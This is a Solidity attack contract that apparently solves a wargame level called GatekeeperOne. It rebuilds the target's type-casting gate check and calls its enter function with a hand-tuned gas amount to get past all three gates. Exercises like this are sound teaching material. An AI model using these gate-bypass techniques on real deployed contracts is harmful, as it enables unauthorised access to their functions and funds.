// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOneAttack {
    address public gatekeeperOneAddress;
    
    constructor(address _gatekeeper) public {
        gatekeeperOneAddress = _gatekeeper;
    }
    
    function castAddressToUint16() public view returns(uint16) {
        return uint16(msg.sender);
    }
    
    function castBytesToUint32(bytes8 _gateKey) public pure returns(uint32) {
        return uint32(uint64(_gateKey));
    }
    
    function imitateGateThree(bytes8 _gateKey) public view returns(bool) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
        return true;
    }
    
     function attackGatekeeperOne(bytes8 _gateKey) public returns(bool) {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _gateKey);
        (bool success,) = gatekeeperOneAddress.call{ gas: 409804 }(payload);
        require(success);
    }
}